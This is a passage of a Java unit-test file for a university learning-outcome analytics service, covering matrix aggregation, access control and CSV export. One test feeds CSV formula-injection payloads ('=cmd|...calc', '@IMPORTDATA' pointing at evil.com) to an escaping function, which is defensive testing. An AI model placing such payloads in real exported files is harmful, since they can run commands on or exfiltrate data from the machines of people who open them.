              .runId("run_pm_success")
              .level(ResultLevel.ASSESSMENT_CLO)
              .subjectId("clo_pv_1")
              .assessmentId("ass_quiz")
              .counts(AggregateResult.Counts.builder().enrolled(30).passed(28).failed(2).build())
              .mean(0.85)
              .build();
      when(aggregateResultRepository.findByRunIdAndLevel(
              "run_pm_success", ResultLevel.ASSESSMENT_CLO))
          .thenReturn(List.of(aggQuiz));

      AnalyticsMatrixResponse resp = analyticsService.getAnalyticsMatrix(req, pmPrincipal);

      assertThat(resp.getRows()).extracting("code").containsExactly("CLO_PV1");
      assertThat(resp.getMatrix().get(0).get(0).getPassed()).isEqualTo(28);
    }

    @Test
    @DisplayName(
        "D5: CURRICULUM_CLASSIFICATION với BLOOM_LEVEL chỉ gom nhóm, không quy đổi điểm số")
    void testCurriculumClassificationBloomLevelGroupingOnly() {
      AnalyticsQueryRequest req =
          AnalyticsQueryRequest.builder()
              .dimension(AnalyticsDimension.CURRICULUM_CLASSIFICATION)
              .classificationType(CurriculumClassificationType.BLOOM_LEVEL)
              .courseId("crs_1")
              .runId("run_success_1")
              .build();

      Clo cloLevel2 = Clo.builder().id("clo_2").code("CLO2").bloomLevel(2).build();
      Clo cloLevel4 = Clo.builder().id("clo_4").code("CLO4").bloomLevel(4).build();
      CourseSection sec =
          CourseSection.builder().id("sec_1").code("SEC_01").courseId("crs_1").build();

      when(calculationRunRepository.findById("run_success_1")).thenReturn(Optional.of(successRun));
      when(courseSectionRepository.findByCourseId("crs_1")).thenReturn(List.of(sec));
      when(mongoTemplate.find(any(Query.class), eq(Clo.class)))
          .thenReturn(List.of(cloLevel2, cloLevel4));

      AggregateResult aggLevel2 =
          AggregateResult.builder()
              .runId("run_success_1")
              .level(ResultLevel.CLO)
              .subjectId("clo_2")
              .sectionId("sec_1")
              .counts(AggregateResult.Counts.builder().enrolled(30).passed(25).failed(5).build())
              .mean(0.75)
              .build();

      when(aggregateResultRepository.findByRunIdAndLevel("run_success_1", ResultLevel.CLO))
          .thenReturn(List.of(aggLevel2));

      AnalyticsMatrixResponse resp = analyticsService.getAnalyticsMatrix(req, adminPrincipal);

      assertThat(resp.getRows()).hasSize(6); // 6 mức Bloom
      // Hàng mức 2 (BLOOM_2) có dữ liệu điểm 0.75 (không bị biến đổi theo số nhân Bloom = 2)
      MatrixMetricCell cellBloom2 = resp.getMatrix().get(1).get(0);
      assertThat(cellBloom2.getMean()).isEqualTo(0.75);
      assertThat(cellBloom2.getPassed()).isEqualTo(25);
      // Hàng mức 1 (BLOOM_1) không có CLO nào -> null
      MatrixMetricCell cellBloom1 = resp.getMatrix().get(0).get(0);
      assertThat(cellBloom1.getMean()).isNull();
      assertThat(cellBloom1.getPassRate()).isNull();
    }

    @Test
    @DisplayName("D3: COHORT dự phòng tổng hợp từ student_results khi chưa có aggregate theo khóa")
    void testCohortDimensionFallbackToStudentResults() {
      AnalyticsQueryRequest req =
          AnalyticsQueryRequest.builder()
              .dimension(AnalyticsDimension.COHORT)
              .programVersionId("pv_cntt")
              .cohorts(List.of("K23", "K24"))
              .level(ResultLevel.PLO)
              .runId("run_success_1")
              .build();

      Plo plo = Plo.builder().id("plo_1").code("PLO1").contentOriginal("PLO gốc").build();
      Student st1 = Student.builder().id("st_1").cohort("K23").build();
      Student st2 = Student.builder().id("st_2").cohort("K23").build();

      StudentResult sr1 =
          StudentResult.builder()
              .studentId("st_1")
              .subjectId("plo_1")
              .status(ResultStatus.COMPUTED)
              .value(0.80)
              .passed(true)
              .build();
      StudentResult sr2 =
          StudentResult.builder()
              .studentId("st_2")
              .subjectId("plo_1")
              .status(ResultStatus.COMPUTED)
              .value(0.40)
              .passed(false)
              .build();

      when(calculationRunRepository.findById("run_success_1")).thenReturn(Optional.of(successRun));
      when(ploRepository.findByProgramVersionIdOrderByDisplayOrderAsc("pv_cntt"))
          .thenReturn(List.of(plo));
      when(aggregateResultRepository.findByRunIdAndLevel("run_success_1", ResultLevel.PLO))
          .thenReturn(List.of());
      when(mongoTemplate.find(any(Query.class), eq(Student.class))).thenReturn(List.of(st1, st2));
      when(studentResultRepository.findByRunIdAndLevel("run_success_1", ResultLevel.PLO))
          .thenReturn(List.of(sr1, sr2));

      AnalyticsMatrixResponse resp = analyticsService.getAnalyticsMatrix(req, adminPrincipal);

      assertThat(resp.getMatrix().get(0).get(0).getEnrolled()).isEqualTo(2);
      assertThat(resp.getMatrix().get(0).get(0).getPassed()).isEqualTo(1);
      assertThat(resp.getMatrix().get(0).get(0).getFailed()).isEqualTo(1);
      assertThat(resp.getMatrix().get(0).get(0).getMean()).isCloseTo(0.60, within(1e-9));
      assertThat(resp.getMatrix().get(0).get(1).getPassRate()).isNull();
    }

    @Test
    @DisplayName("D5: CURRICULUM_CLASSIFICATION hỗ trợ PLO_CATEGORY và COURSE_TYPE")
    void testCurriculumClassificationPloCategoryAndCourseType() {
      when(calculationRunRepository.findById("run_success_1")).thenReturn(Optional.of(successRun));

      // 1. PLO_CATEGORY
      AnalyticsQueryRequest ploCatReq =
          AnalyticsQueryRequest.builder()
              .dimension(AnalyticsDimension.CURRICULUM_CLASSIFICATION)
              .classificationType(CurriculumClassificationType.PLO_CATEGORY)
              .programVersionId("pv_cntt")
              .cohorts(List.of("K23"))
              .runId("run_success_1")
              .build();

      Plo generalPlo =
          Plo.builder().id("plo_gen").code("PLO1").category(PloCategory.GENERAL).build();
      AggregateResult ploAgg =
          AggregateResult.builder()
              .runId("run_success_1")
              .level(ResultLevel.PLO)
              .subjectId("plo_gen")
              .scope(
                  AggregateResult.Scope.builder()
                      .type(AggregateScopeType.COHORT)
                      .cohort("K23")
                      .build())
              .counts(AggregateResult.Counts.builder().enrolled(50).passed(45).failed(5).build())
              .mean(0.82)
              .build();

      when(ploRepository.findByProgramVersionIdOrderByDisplayOrderAsc("pv_cntt"))
          .thenReturn(List.of(generalPlo));
      when(aggregateResultRepository.findByRunIdAndLevel("run_success_1", ResultLevel.PLO))
          .thenReturn(List.of(ploAgg));

      AnalyticsMatrixResponse ploCatResp =
          analyticsService.getAnalyticsMatrix(ploCatReq, adminPrincipal);
      assertThat(ploCatResp.getRows()).hasSize(3);
      assertThat(ploCatResp.getMatrix().get(0).get(0).getPassed()).isEqualTo(45);
      assertThat(ploCatResp.getMatrix().get(1).get(0).getPassRate()).isNull();

      // 2. COURSE_TYPE
      AnalyticsQueryRequest courseTypeReq =
          AnalyticsQueryRequest.builder()
              .dimension(AnalyticsDimension.CURRICULUM_CLASSIFICATION)
              .classificationType(CurriculumClassificationType.COURSE_TYPE)
              .programVersionId("pv_cntt")
              .termIds(List.of("term_1"))
              .runId("run_success_1")
              .build();

      Term term = Term.builder().id("term_1").code("HK1").academicYear("2025-2026").build();
      ProgramCourse compulsoryPc =
          ProgramCourse.builder()
              .programVersionId("pv_cntt")
              .courseId("crs_comp")
              .type(CourseType.COMPULSORY)
              .build();
      Clo cloComp = Clo.builder().id("clo_comp").courseId("crs_comp").code("CLO1").build();
      CourseSection sec = CourseSection.builder().id("sec_comp").termId("term_1").build();
      AggregateResult cloAgg =
          AggregateResult.builder()
              .runId("run_success_1")
              .level(ResultLevel.CLO)
              .subjectId("clo_comp")
              .sectionId("sec_comp")
              .counts(AggregateResult.Counts.builder().enrolled(40).passed(32).failed(8).build())
              .mean(0.74)
              .build();

      when(termRepository.findAllById(List.of("term_1"))).thenReturn(List.of(term));
      when(programCourseRepository.findByProgramVersionIdOrderBySemesterAscCourseIdAsc("pv_cntt"))
          .thenReturn(List.of(compulsoryPc));
      when(cloRepository.findAll()).thenReturn(List.of(cloComp));
      when(courseSectionRepository.findAll()).thenReturn(List.of(sec));
      when(aggregateResultRepository.findByRunIdAndLevel("run_success_1", ResultLevel.CLO))
          .thenReturn(List.of(cloAgg));

      AnalyticsMatrixResponse courseTypeResp =
          analyticsService.getAnalyticsMatrix(courseTypeReq, adminPrincipal);
      assertThat(courseTypeResp.getRows())
          .extracting("code")
          .containsExactly("COMPULSORY", "ELECTIVE");
      assertThat(courseTypeResp.getMatrix().get(0).get(0).getPassed()).isEqualTo(32);
      assertThat(courseTypeResp.getMatrix().get(1).get(0).getPassRate()).isNull();
    }
  }

  @Nested
  @DisplayName("5. Matrix CSV Export (R4)")
  class MatrixCsvExportTests {

    @Test
    @DisplayName("Xuất CSV chuẩn RFC 4180 bắt đầu bằng UTF-8 BOM và chứa dữ liệu ma trận")
    void testExportAnalyticsMatrixCsv() {
      AnalyticsQueryRequest req =
          AnalyticsQueryRequest.builder()
              .dimension(AnalyticsDimension.COURSE_SECTIONS)
              .courseId("crs_1")
              .runId("run_success_1")
              .build();

      CourseSection sec =
          CourseSection.builder().id("sec_1").code("OOP_01").courseId("crs_1").build();
      Clo clo =
          Clo.builder()
              .id("clo_1")
              .code("CLO1")
              .contentOriginal("Đóng gói, kế thừa")
              .bloomLevel(2)
              .build();

      stubCourseSectionsCloScenario("crs_1", List.of(sec), clo, 40, 36, 4, 0.85, 0.90);

      byte[] csvBytes = analyticsService.exportAnalyticsMatrixCsv(req, adminPrincipal);

      assertThat(csvBytes).isNotEmpty();
      String csvText = new String(csvBytes, StandardCharsets.UTF_8);

      // Bắt đầu bằng UTF-8 BOM (\uFEFF)
      assertThat(csvText.startsWith("\uFEFF")).isTrue();
      // Chứa thông tin tiêu đề và mã cột
      assertThat(csvText).contains("BÁO CÁO PHÂN TÍCH ĐA CHIỀU");
      assertThat(csvText).contains("OOP_01");
      assertThat(csvText).contains("CLO1");
      assertThat(csvText).contains("90.00%");
      assertThat(csvText).contains("DỮ LIỆU CHI TIẾT (RAW METRIC RECORDS)");
    }

    @Test
    @DisplayName(
        "Thoát an toàn các ký tự kích hoạt công thức CSV ('=', '+', '-', '@', '\\t', '\\r')")
    void shouldEscapeFormulaInjectionCharactersInCsvExport() {
      assertThat(matrixCsvExporter.escape("=cmd|'/C calc'!A0")).isEqualTo("'=cmd|'/C calc'!A0");
      assertThat(matrixCsvExporter.escape("+12345")).isEqualTo("'+12345");
      assertThat(matrixCsvExporter.escape("+SUM(1,2)")).isEqualTo("\"'+SUM(1,2)\"");
      assertThat(matrixCsvExporter.escape("-10+20")).isEqualTo("'-10+20");
      assertThat(matrixCsvExporter.escape("@IMPORTDATA(\"http://evil.com\")"))
          .isEqualTo("\"'@IMPORTDATA(\"\"http://evil.com\"\")\"");
      assertThat(matrixCsvExporter.escape("\tmalicious")).isEqualTo("'\tmalicious");
      assertThat(matrixCsvExporter.escape("  =cmd|' /C calc'!A0"))
          .isEqualTo("'  =cmd|' /C calc'!A0");
      assertThat(matrixCsvExporter.escape("CLO1")).isEqualTo("CLO1");

      AnalyticsMatrixResponse response =
          AnalyticsMatrixResponse.builder()
              .dimension(AnalyticsDimension.COURSE_SECTIONS)
              .level(ResultLevel.CLO)
              .columns(List.of(MatrixHeader.builder().id("col1").code("=cmd|calc").build()))
              .rows(List.of(MatrixHeader.builder().id("row1").code("-10+20").name("@evil").build()))
              .matrix(List.of(List.of(MatrixMetricCell.builder().passRate(0.8).build())))
              .build();

      byte[] bytes = matrixCsvExporter.exportToCsv(response);
      String csv = new String(bytes, StandardCharsets.UTF_8);

      assertThat(csv).contains("'=cmd|calc");
      assertThat(csv).contains("'-10+20");
      assertThat(csv).contains("'@evil");
    }
  }

  @Nested
  @DisplayName("6. New Dimensions: COURSE_LECTURER & STUDENT (R1)")
  class NewDimensionsTests {

    // --- Chiều COURSE_LECTURER ---

    @Test
    @DisplayName(
        "COURSE_LECTURER: Happy path cho ADMIN tổng hợp hiệu quả giảng dạy theo giảng viên")
    void testCourseLecturerHappyPathAdmin() {
      AnalyticsQueryRequest req =
          AnalyticsQueryRequest.builder()
              .dimension(AnalyticsDimension.COURSE_LECTURER)
              .courseId("crs_algo")
              .runId("run_success_1")
              .build();

      User lec1 = User.builder().id("lec_1").username("gv_nam").fullName("TS. Nam").build();
      User lec2 = User.builder().id("lec_2").username("gv_hoa").fullName("ThS. Hoa").build();

      CourseSection sec1 =
          CourseSection.builder()
              .id("sec_1")
              .courseId("crs_algo")
              .lecturerIds(List.of("lec_1"))
              .build();
      CourseSection sec2 =
          CourseSection.builder()
              .id("sec_2")
              .courseId("crs_algo")
              .lecturerIds(List.of("lec_2"))
              .build();
      CourseSection sec3 =
          CourseSection.builder()
              .id("sec_3")
              .courseId("crs_algo")
              .lecturerIds(List.of("lec_1"))
              .build();

      Clo clo1 =
          Clo.builder().id("clo_1").code("CLO1").contentOriginal("Độ phức tạp thuật toán").build();

      AggregateResult aggSec1 =
          AggregateResult.builder()
              .runId("run_success_1")
              .level(ResultLevel.CLO)
              .subjectId("clo_1")
              .sectionId("sec_1")
              .counts(AggregateResult.Counts.builder().enrolled(30).passed(24).failed(6).build())
              .mean(0.70)
              .build();

      AggregateResult aggSec2 =
          AggregateResult.builder()
              .runId("run_success_1")
              .level(ResultLevel.CLO)
              .subjectId("clo_1")
              .sectionId("sec_2")
              .counts(AggregateResult.Counts.builder().enrolled(40).passed(36).failed(4).build())
              .mean(0.85)
              .build();

      AggregateResult aggSec3 =
          AggregateResult.builder()
              .runId("run_success_1")
              .level(ResultLevel.CLO)
              .subjectId("clo_1")
              .sectionId("sec_3")
              .counts(AggregateResult.Counts.builder().enrolled(20).passed(16).failed(4).build())
              .mean(0.80)
              .build();

      when(calculationRunRepository.findById("run_success_1")).thenReturn(Optional.of(successRun));
      when(courseSectionRepository.findByCourseId("crs_algo"))
          .thenReturn(List.of(sec1, sec2, sec3));
      when(userRepository.findAllById(any())).thenReturn(List.of(lec2, lec1));
      when(mongoTemplate.find(any(Query.class), eq(Clo.class))).thenReturn(List.of(clo1));
      when(aggregateResultRepository.findByRunIdAndLevel("run_success_1", ResultLevel.CLO))
          .thenReturn(List.of(aggSec1, aggSec2, aggSec3));

      AnalyticsMatrixResponse resp = analyticsService.getAnalyticsMatrix(req, adminPrincipal);

      assertThat(resp.getDimension()).isEqualTo(AnalyticsDimension.COURSE_LECTURER);
      assertThat(resp.getLevel()).isEqualTo(ResultLevel.CLO);
      assertThat(resp.getRows()).extracting("code").containsExactly("CLO1");
      // Cột được sắp xếp theo username: gv_hoa, gv_nam
      assertThat(resp.getColumns()).extracting("code").containsExactly("gv_hoa", "gv_nam");

      // Cột 0: gv_hoa (sec2) -> enrolled=40, passed=36, failed=4, mean=0.85, passRate=0.90
      MatrixMetricCell cellHoa = resp.getMatrix().get(0).get(0);
      assertThat(cellHoa.getEnrolled()).isEqualTo(40);
      assertThat(cellHoa.getPassed()).isEqualTo(36);
      assertThat(cellHoa.getFailed()).isEqualTo(4);
      assertThat(cellHoa.getMean()).isEqualTo(0.85);
      assertThat(cellHoa.getPassRate()).isCloseTo(0.90, within(1e-9));

      // Cột 1: gv_nam (sec1 + sec3) -> enrolled=50, passed=40, failed=10
      // Mean có trọng số: (0.70*30 + 0.80*20) / 50 = (21 + 16) / 50 = 37 / 50 = 0.74
      MatrixMetricCell cellNam = resp.getMatrix().get(0).get(1);
      assertThat(cellNam.getEnrolled()).isEqualTo(50);
      assertThat(cellNam.getPassed()).isEqualTo(40);
      assertThat(cellNam.getFailed()).isEqualTo(10);
      assertThat(cellNam.getMean()).isCloseTo(0.74, within(1e-9));
      assertThat(cellNam.getPassRate()).isCloseTo(0.80, within(1e-9));
    }

    @Test
    @DisplayName("COURSE_LECTURER: LECTURER tự xem chỉ xuất hiện cột của chính mình")
    void testCourseLecturerLecturerSelfOnly() {
      AnalyticsQueryRequest req =
          AnalyticsQueryRequest.builder()
              .dimension(AnalyticsDimension.COURSE_LECTURER)
              .courseId("crs_algo")
              .runId("run_success_1")
              .build();

      User lecMe =
          User.builder().id("user_lecturer").username("lecturer").fullName("TS. Me").build();
      CourseSection sec =
          CourseSection.builder()
              .id("sec_me")
              .courseId("crs_algo")
              .lecturerIds(List.of("user_lecturer"))
              .build();
      Clo clo = Clo.builder().id("clo_1").code("CLO1").build();

      CalculationRun run =
          CalculationRun.builder()
              .id("run_success_1")
              .status(CalculationStatus.SUCCESS)
              .official(true)
              .stale(false)
              .scopeRef(CalculationRun.ScopeRef.builder().courseIds(List.of("crs_algo")).build())
              .build();

      when(scopeAuthorizationService.canAccessCourse(
              lecturerPrincipal, "crs_algo", AccessType.READ))
          .thenReturn(true);
      when(calculationRunRepository.findById("run_success_1")).thenReturn(Optional.of(run));
      when(courseSectionRepository.findByCourseId("crs_algo")).thenReturn(List.of(sec));
      when(userRepository.findAllById(List.of("user_lecturer"))).thenReturn(List.of(lecMe));
      when(mongoTemplate.find(any(Query.class), eq(Clo.class))).thenReturn(List.of(clo));
      when(aggregateResultRepository.findByRunIdAndLevel("run_success_1", ResultLevel.CLO))
          .thenReturn(List.of());

      AnalyticsMatrixResponse resp = analyticsService.getAnalyticsMatrix(req, lecturerPrincipal);

      assertThat(resp.getColumns()).extracting("id").containsExactly("user_lecturer");
    }

    @Test
    @DisplayName(
        "COURSE_LECTURER: LECTURER truy vấn ID của giảng viên khác bị ném AccessDeniedException")
    void testCourseLecturerLecturerQueryingOtherLecturerForbidden() {
      AnalyticsQueryRequest req =
          AnalyticsQueryRequest.builder()
              .dimension(AnalyticsDimension.COURSE_LECTURER)
              .courseId("crs_algo")
              .lecturerId("other_lecturer")
              .build();

      when(scopeAuthorizationService.canAccessCourse(
              lecturerPrincipal, "crs_algo", AccessType.READ))
          .thenReturn(true);

      assertThatThrownBy(() -> analyticsService.getAnalyticsMatrix(req, lecturerPrincipal))
          .isInstanceOf(AccessDeniedException.class)
          .hasMessageContaining("Giảng viên chỉ được xem hiệu quả giảng dạy của chính mình");
    }

    @Test
    @DisplayName(
        "COURSE_LECTURER: Zero-denominator safety khi giảng viên có lớp nhưng chưa đánh giá")
    void testCourseLecturerZeroDenominatorSafety() {
      AnalyticsQueryRequest req =
          AnalyticsQueryRequest.builder()
              .dimension(AnalyticsDimension.COURSE_LECTURER)
              .courseId("crs_algo")
              .runId("run_success_1")
              .build();

      User lec = User.builder().id("lec_1").username("gv_moi").build();
      CourseSection sec =
          CourseSection.builder()
              .id("sec_1")
              .courseId("crs_algo")
              .lecturerIds(List.of("lec_1"))
              .build();
      Clo clo = Clo.builder().id("clo_1").code("CLO1").build();

      AggregateResult aggEmpty =
          AggregateResult.builder()
              .runId("run_success_1")
              .level(ResultLevel.CLO)
              .subjectId("clo_1")
              .sectionId("sec_1")
              .counts(AggregateResult.Counts.builder().enrolled(30).passed(0).failed(0).build())
              .mean(null)
              .passRate(null)
              .build();

      when(calculationRunRepository.findById("run_success_1")).thenReturn(Optional.of(successRun));
      when(courseSectionRepository.findByCourseId("crs_algo")).thenReturn(List.of(sec));
      when(userRepository.findAllById(any())).thenReturn(List.of(lec));
      when(mongoTemplate.find(any(Query.class), eq(Clo.class))).thenReturn(List.of(clo));
      when(aggregateResultRepository.findByRunIdAndLevel("run_success_1", ResultLevel.CLO))
          .thenReturn(List.of(aggEmpty));

      AnalyticsMatrixResponse resp = analyticsService.getAnalyticsMatrix(req, adminPrincipal);

      MatrixMetricCell cell = resp.getMatrix().get(0).get(0);
      assertThat(cell.getEvaluated()).isEqualTo(0);
      assertThat(cell.getMean()).isNull();
      assertThat(cell.getPassRate()).isNull();
      assertThat(cell.getPassRateOfEnrolled()).isNull();
    }

    // --- Chiều STUDENT ---

    @Test
    @DisplayName("STUDENT: Happy path cấp độ CLO theo lớp học phần")
    void testStudentHappyPathCloLevel() {
      AnalyticsQueryRequest req =
          AnalyticsQueryRequest.builder()
              .dimension(AnalyticsDimension.STUDENT)
              .courseId("crs_algo")
              .sectionIds(List.of("sec_1"))
              .runId("run_success_1")
              .build();

      Student s1 =
          Student.builder().id("st_1").studentCode("21110001").fullName("Nguyễn Văn A").build();
      Student s2 =
          Student.builder().id("st_2").studentCode("21110002").fullName("Trần Thị B").build();

      Enrollment e1 =
          Enrollment.builder()
              .sectionId("sec_1")
              .studentId("st_1")
              .status(EnrollmentStatus.ENROLLED)
              .build();
      Enrollment e2 =
          Enrollment.builder()
              .sectionId("sec_1")
              .studentId("st_2")
              .status(EnrollmentStatus.ENROLLED)
              .build();

      Clo clo1 = Clo.builder().id("clo_1").code("CLO1").build();
      Clo clo2 = Clo.builder().id("clo_2").code("CLO2").build();

      StudentResult sr1_clo1 =
          StudentResult.builder()
              .runId("run_success_1")
              .level(ResultLevel.CLO)
              .subjectId("clo_1")
              .studentId("st_1")
              .status(ResultStatus.COMPUTED)
              .value(0.85)
              .passed(true)
              .build();

      StudentResult sr2_clo1 =
          StudentResult.builder()
              .runId("run_success_1")
              .level(ResultLevel.CLO)
              .subjectId("clo_1")
              .studentId("st_2")
              .status(ResultStatus.COMPUTED)
              .value(0.40)
              .passed(false)
              .build();

      StudentResult sr1_clo2 =
          StudentResult.builder()
              .runId("run_success_1")
              .level(ResultLevel.CLO)
              .subjectId("clo_2")
              .studentId("st_1")
              .status(ResultStatus.INSUFFICIENT_DATA)
              .build();

      when(calculationRunRepository.findById("run_success_1")).thenReturn(Optional.of(successRun));
      when(mongoTemplate.find(any(Query.class), eq(Clo.class))).thenReturn(List.of(clo1, clo2));
      when(courseSectionRepository.findAllById(List.of("sec_1")))
          .thenReturn(List.of(CourseSection.builder().id("sec_1").courseId("crs_algo").build()));
      when(enrollmentRepository.findBySectionIdInAndStatus(
              List.of("sec_1"), EnrollmentStatus.ENROLLED))
          .thenReturn(List.of(e1, e2));
      when(studentRepository.findAllById(any())).thenReturn(List.of(s2, s1));
      when(studentResultRepository.findByRunIdAndLevel("run_success_1", ResultLevel.CLO))
          .thenReturn(List.of(sr1_clo1, sr2_clo1, sr1_clo2));

      AnalyticsMatrixResponse resp = analyticsService.getAnalyticsMatrix(req, adminPrincipal);

      assertThat(resp.getDimension()).isEqualTo(AnalyticsDimension.STUDENT);
      assertThat(resp.getLevel()).isEqualTo(ResultLevel.CLO);
      assertThat(resp.getPage()).isZero();
      assertThat(resp.getSize()).isEqualTo(20);
      assertThat(resp.getTotalElements()).isEqualTo(2L);
      assertThat(resp.getTotalPages()).isEqualTo(1);
      assertThat(resp.getLast()).isTrue();
      // Cột sinh viên sắp xếp theo MSSV
      assertThat(resp.getColumns()).extracting("code").containsExactly("21110001", "21110002");
      assertThat(resp.getRows()).extracting("code").containsExactly("CLO1", "CLO2");

      // Phân trang cột sinh viên với size=1 -> page 0 chỉ lấy sinh viên đầu, export vẫn xuất đủ
      AnalyticsQueryRequest pagedReq =
          AnalyticsQueryRequest.builder()
              .dimension(AnalyticsDimension.STUDENT)
              .courseId("crs_algo")
              .sectionIds(List.of("sec_1"))
              .runId("run_success_1")
              .page(0)
              .size(1)
              .build();
      AnalyticsMatrixResponse page0 = analyticsService.getAnalyticsMatrix(pagedReq, adminPrincipal);
      assertThat(page0.getColumns()).extracting("code").containsExactly("21110001");
      assertThat(page0.getMatrix().get(0)).hasSize(1);
      assertThat(page0.getTotalElements()).isEqualTo(2L);
      assertThat(page0.getTotalPages()).isEqualTo(2);
      assertThat(page0.getLast()).isFalse();

      when(matrixCsvExporter.exportToCsv(any()))
          .thenAnswer(
              inv -> {
                AnalyticsMatrixResponse exported = inv.getArgument(0);
                return exported.getColumns().stream()
                    .map(MatrixHeader::getCode)
                    .reduce((a, b) -> a + "," + b)
                    .orElse("")
                    .getBytes(StandardCharsets.UTF_8);
              });
      String exportedCodes =
          new String(
              analyticsService.exportAnalyticsMatrixCsv(pagedReq, adminPrincipal),
              StandardCharsets.UTF_8);
      assertThat(exportedCodes).isEqualTo("21110001,21110002");

      byte[] xlsxBytes = analyticsService.exportAnalyticsMatrixXlsx(pagedReq, adminPrincipal);
      verify(matrixExcelExporter).exportToXlsx(any());
      assertThat(xlsxBytes).isNotEmpty();
      assertThat(xlsxBytes[0]).isEqualTo((byte) 'P');
      assertThat(xlsxBytes[1]).isEqualTo((byte) 'K');

      // Dòng CLO1:
      // s1: đạt (mean=0.85, passed=1, passRate=1.0)
      MatrixMetricCell cell1_1 = resp.getMatrix().get(0).get(0);
      assertThat(cell1_1.getEvaluated()).isEqualTo(1);
      assertThat(cell1_1.getPassed()).isEqualTo(1);
      assertThat(cell1_1.getMean()).isEqualTo(0.85);
      assertThat(cell1_1.getPassRate()).isEqualTo(1.0);

      // s2: chưa đạt (mean=0.40, passed=0, failed=1, passRate=0.0)
      MatrixMetricCell cell1_2 = resp.getMatrix().get(0).get(1);
      assertThat(cell1_2.getEvaluated()).isEqualTo(1);
      assertThat(cell1_2.getPassed()).isEqualTo(0);
      assertThat(cell1_2.getFailed()).isEqualTo(1);
      assertThat(cell1_2.getMean()).isEqualTo(0.40);
      assertThat(cell1_2.getPassRate()).isEqualTo(0.0);

      // Dòng CLO2:
      // s1: INSUFFICIENT_DATA -> enrolled=1, evaluated=0, insufficientData=1, mean=null,
      // passRate=null
      MatrixMetricCell cell2_1 = resp.getMatrix().get(1).get(0);
      assertThat(cell2_1.getEnrolled()).isEqualTo(1);
      assertThat(cell2_1.getEvaluated()).isEqualTo(0);
      assertThat(cell2_1.getInsufficientData()).isEqualTo(1);
      assertThat(cell2_1.getMean()).isNull();
      assertThat(cell2_1.getPassRate()).isNull();

      // s2: vắng/không có kết quả -> empty cell
      MatrixMetricCell cell2_2 = resp.getMatrix().get(1).get(1);
      assertThat(cell2_2.getEnrolled()).isEqualTo(0);
      assertThat(cell2_2.getEvaluated()).isEqualTo(0);
      assertThat(cell2_2.getMean()).isNull();
    }

    @Test
    @DisplayName("STUDENT: Happy path cấp độ PLO theo phiên bản CTĐT")
    void testStudentHappyPathPloLevel() {
      AnalyticsQueryRequest req =
          AnalyticsQueryRequest.builder()
              .dimension(AnalyticsDimension.STUDENT)
              .programVersionId("pv_cntt")
              .studentIds(List.of("st_1"))
              .runId("run_success_1")
              .build();

      Student s1 =
          Student.builder().id("st_1").studentCode("21110001").fullName("Nguyễn Văn A").build();
      Plo plo1 =
          Plo.builder().id("plo_1").code("PLO1").contentOriginal("Áp dụng kiến thức").build();

      StudentResult sr =
          StudentResult.builder()
              .runId("run_success_1")
              .level(ResultLevel.PLO)
              .subjectId("plo_1")
              .studentId("st_1")
              .status(ResultStatus.COMPUTED)
              .value(0.90)
              .passed(true)
              .build();

      when(calculationRunRepository.findById("run_success_1")).thenReturn(Optional.of(successRun));
      when(ploRepository.findByProgramVersionIdOrderByDisplayOrderAsc("pv_cntt"))
          .thenReturn(List.of(plo1));
      when(studentRepository.findAllById(List.of("st_1"))).thenReturn(List.of(s1));
      when(studentResultRepository.findByRunIdAndLevel("run_success_1", ResultLevel.PLO))
          .thenReturn(List.of(sr));

      AnalyticsMatrixResponse resp = analyticsService.getAnalyticsMatrix(req, adminPrincipal);

      assertThat(resp.getDimension()).isEqualTo(AnalyticsDimension.STUDENT);
      assertThat(resp.getLevel()).isEqualTo(ResultLevel.PLO);
      assertThat(resp.getColumns()).extracting("code").containsExactly("21110001");
      assertThat(resp.getRows()).extracting("code").containsExactly("PLO1");
      MatrixMetricCell cell = resp.getMatrix().get(0).get(0);
      assertThat(cell.getEvaluated()).isEqualTo(1);
      assertThat(cell.getPassed()).isEqualTo(1);
      assertThat(cell.getMean()).isEqualTo(0.90);
    }

    @Test
    @DisplayName("STUDENT: LECTURER bị từ chối khi truy vấn lớp không phụ trách")
    void testStudentLecturerUnauthorizedSectionForbidden() {
      AnalyticsQueryRequest req =
          AnalyticsQueryRequest.builder()
              .dimension(AnalyticsDimension.STUDENT)
              .sectionIds(List.of("sec_unauthorized"))
              .build();

      when(scopeAuthorizationService.canAccessSection(
              lecturerPrincipal, "sec_unauthorized", AccessType.READ))
          .thenReturn(false);

      assertThatThrownBy(() -> analyticsService.getAnalyticsMatrix(req, lecturerPrincipal))
          .isInstanceOf(AccessDeniedException.class)
          .hasMessageContaining("Không có quyền truy cập");
    }

    @Test
    @DisplayName("Xuất CSV cho cả 2 chiều mới COURSE_LECTURER và STUDENT thành công với UTF-8 BOM")
    void testCsvExportForNewDimensions() {
      // 1. Export COURSE_LECTURER
      AnalyticsMatrixResponse respLec =
          AnalyticsMatrixResponse.builder()
              .dimension(AnalyticsDimension.COURSE_LECTURER)
              .level(ResultLevel.CLO)
              .runId("run_1")
              .columns(List.of(MatrixHeader.builder().id("l1").code("gv01").name("TS. An").build()))
              .rows(List.of(MatrixHeader.builder().id("c1").code("CLO1").name("Mô tả CLO").build()))
              .matrix(
                  List.of(
                      List.of(
                          MatrixMetricCell.builder()
                              .enrolled(30)
                              .evaluated(30)
                              .passed(27)
                              .failed(3)
                              .mean(0.85)
                              .passRate(0.90)
                              .build())))
              .build();

      byte[] bytesLec = matrixCsvExporter.exportToCsv(respLec);
      String csvLec = new String(bytesLec, StandardCharsets.UTF_8);
      assertThat(csvLec).startsWith("\uFEFF");
      assertThat(csvLec).contains("COURSE_LECTURER");
      assertThat(csvLec).contains("gv01");
      assertThat(csvLec).contains("90.00%");

      // 2. Export STUDENT
      AnalyticsMatrixResponse respStu =
          AnalyticsMatrixResponse.builder()
              .dimension(AnalyticsDimension.STUDENT)
              .level(ResultLevel.CLO)
              .runId("run_1")
              .columns(
                  List.of(
                      MatrixHeader.builder().id("s1").code("21110099").name("Lê Văn C").build()))
              .rows(List.of(MatrixHeader.builder().id("c1").code("CLO1").name("Mô tả CLO").build()))
              .matrix(
                  List.of(
                      List.of(
                          MatrixMetricCell.builder()
                              .enrolled(1)
                              .evaluated(1)
                              .passed(1)
                              .failed(0)
                              .mean(0.95)
                              .passRate(1.0)
                              .build())))
              .build();

      byte[] bytesStu = matrixCsvExporter.exportToCsv(respStu);
      String csvStu = new String(bytesStu, StandardCharsets.UTF_8);
      assertThat(csvStu).startsWith("\uFEFF");
      assertThat(csvStu).contains("STUDENT");
      assertThat(csvStu).contains("21110099");
      assertThat(csvStu).contains("100.00%");
    }
  }

